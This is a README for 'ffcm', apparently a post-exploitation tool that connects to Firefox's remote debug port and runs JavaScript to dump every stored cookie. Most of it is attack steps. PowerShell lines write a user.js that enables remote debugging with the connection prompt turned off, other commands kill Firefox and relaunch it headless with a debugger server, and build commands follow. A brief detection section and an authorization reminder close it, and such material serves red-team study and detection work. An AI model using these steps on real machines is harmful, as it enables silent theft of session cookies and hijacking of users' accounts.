# Firefox - Debug Client for Cookie Access

Connect to Firefox debug port and issue Javascript commands and read responses - useful for grabbing cookies.

For now I have focused on Windows, but it should work with macOS (even more useful there actually) - but I don't have a MacBook at the moment to test it.


## Technical things and debug protocol

This tool is doing things at the TCP level using `net.Dial` to get a TCP client (`Conn`) to Firefox. 

It then sends various config and setup debug messages as JSON serialized objects to eventually run Javascript commands using the `evaluateJSAsync` method and access `Services.cookies.cookies`. 

There is likely a much better/easier way to implemented this, as Firefox recently (since 78) added a `Network.getAllCookies` Debug API, and I was not yet able to figure out how to invoke that. 

The Mozilla documentation for the `Remote Debug Protocol` is located here: https://docs.firefox-dev.tools/backend/protocol.html

This tool is written in Golang using concurrent sender/receiver routines, because I thought it's cool to play around with that.

The code leverages a single struct for 5 different "kind of" messages to the server. The structure is named `wireMessage` and represents all possible JSON requests/responses. Due to the use of a single message type for all requests/responses it can get a bit messy trying to understand the code. Yay. :)


## Inspired by Cookie Crimes

What inspired me to research this for Firefox? Go check out [Cookie Crimes](https://github.com/defaultnamehere/cookie_crimes) for Chrome by @mangopdf.

## Background and more info about browser remote debugging

There is more background info about the tool and browser remote debugging on my blog at: 

* [Remote Debugging with Firefox](https://embracethered.com/blog/posts/2020/cookies-on-firefox/)
* [Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
* [Cookie Crimes and the new Microsoft Edge Browser](https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/)


## Basic usage

```
.\ffcm.exe 
```

The result is cookies in the form of `name:value:domain`

![ffcm output](https://embracethered.com/blog/images/2020/firefox/output.png)

### Command line options

* **-server**: the name of the debug server, by default localhost
* **-port**: the port of the debug server, by default set to 9222
* **-log**: flag that will enable logging to stdout for debug purposes, by default not specified


**Note:** By default the debug port of Firefox is not enabled. See the section below on how to setup and enable Firefox remote debug protocol.

### Want to run some other code in the debugger?

You can update the Javascript command being sent to the server by changing the `defaultCommand` constant in the source code.

## Enabling remote debugging

To enable remote debugging the following Firefox settings have to be updated:

* *devtools.debugger.remote-enabled*
* *devtools.debugger.prompt-connection*
* *devtools.chrome.enabled*

### Windows setup

Below are a few lines of PowerShell which create a `user.js` which typically seems to get merged into the `pref.js` file. If it does not work via the `user.js` file, you can try to update the `pref.js` file directly - but for me the `user.js` file has worked well.

Firefox needs a restart for them to be picked up.

First, retrieve the users's profile via:

```
$firstprofile = (gci $env:APPDATA\Mozilla\Firefox\Profiles\*.default-rel* -Directory | Select-Object -First 1).FullName
```

And add the following lines to the `user.js` file (by default this file does not exist):

```
write 'user_pref("devtools.chrome.enabled", true);' | out-file $firstprofile\user.js -Append -Encoding ascii
write 'user_pref("devtools.debugger.remote-enabled", true);'  | out-file $firstprofile\user.js -Append -Encoding ascii
write 'user_pref("devtools.debugger.prompt-connection", false);' | out-file $firstprofile\user.js -Append -Encoding ascii
```

That's it, next time Firefox starts the settings will be applied.


### Connecting and launching ffcm

Here are two commands that might come in handy when trying this, first is to terminate all instances of Firefox:
```
Get-Process -Name firefox | Stop-Proces
```

And launching Firefox with the `-start-debugger-server` option:

```
Start-Process 'C:\Program Files\Mozilla Firefox\firefox.exe' -ArgumentList "-start-debugger-server 9222 -headless"
```

After that you can launch `ffcm.exe` the results are sent to `stdout`.


### macOS Setup

// TODO

## Detections and alerting

* Looking for `-start-remote-debugger` command line arguments to Firefox
* Modification of `user.js` and `prefs.js` files, especially modifications to the 3 settings related to enabling remote debugging

## Build

Very simple, get the code (`main.go` file) and build it.

### Get the code

```
go get github.com/wunderwuzzi23/firefox-cookiemonster
```

or 

```
git clone https://github.com/wunderwuzzi23/firefox-cookiemonster
```


### Build command

```
build -o ffcm.exe main.go
```

#### Cross compile

If you code Go on Linux or WSL you can cross-compile with:

```
$ env GOARCH=amd64 GOOS=windows go build -o ffcm.exe main.go
```

### Interesting behavior with cross compiled Go binaries!

Windows Defender seems to be doing **some extra security scans for cross compiled binaries**. I got a popup from Defender saying it might take up to 10 seconds for the binary to run because its being scanned... It still ran without issues though. When compiling natively on Windows there was no extra scan or popup.

## Blog

If you like this stuff, check out the [Embrace the Red](https://embracethered.com) blog.


## Final remarks

**As always the reminder that pen testing requires authorization from proper stakeholders.** This information is provided to improve the understanding of attacks and build better mitigations and improve detections.

